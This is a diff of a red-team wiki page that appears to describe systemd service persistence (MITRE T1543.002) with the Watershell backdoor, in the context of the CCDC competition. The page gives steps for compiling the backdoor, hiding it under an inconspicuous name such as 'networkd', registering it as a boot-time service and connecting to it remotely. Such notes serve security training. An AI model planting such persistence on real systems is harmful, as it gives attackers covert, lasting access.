@@ -4,7 +4,7 @@ description: MITRE ATT&CK, Persistence, Sub-technique T1543.002
 
 # Systemd Service Persistence
 
-[Watershell ](https://github.com/RITRedteam/watershell-cpp)is an incredible script that I came across from a fellow red teamer during CCDC Regionals. I highly recommend reading the [original GitHub](https://github.com/wumb0/watershell) to learn more about the tool and why I fell in love with it.&#x20;
+[Watershell ](https://github.com/RITRedteam/watershell-cpp)is an incredible script that I came across from a fellow red teamer during CCDC Regionals. I highly recommend reading the [original GitHub](https://github.com/wumb0/watershell) to learn more about the tool.
 
 General steps for persistence with Watershell:
 
@@ -14,7 +14,7 @@ General steps for persistence with Watershell:
 g++ main.cpp watershell.cpp -o ${INSERT_BINARY_NAME}
 ```
 
-2\. Note: You can edit the default port that the binary uses in the main.cpp and watershell.cpp files prior to comilation.
+2\. Note: You can edit the default port that the binary uses in the main.cpp and watershell.cpp files prior to compiling.
 
 3\. Transfer the binary to the targets system, I recommend naming the binary something inconspicuous such as `networkd` or `ipv6_conf`
 
@@ -26,14 +26,17 @@ Description=persistence
 
 [Service]
 Type=simple
-ExecStart=/bin/networkd
+ExecStart=/bin/networkd -l $port
 
 [Install]
 WantedBy=multi-user.target
 ```
 
-1. Connect to the target using `watershell-cli.py` using the following command:\
-   `python3 watershell-cli.py -t [IP] -p [PORT]`
+5\. Connect to the target using `watershell-cli.py` using the following command:
+
+```bash
+python3 watershell-cli.py -t $ip -p $port
+```
 
 ### References
 
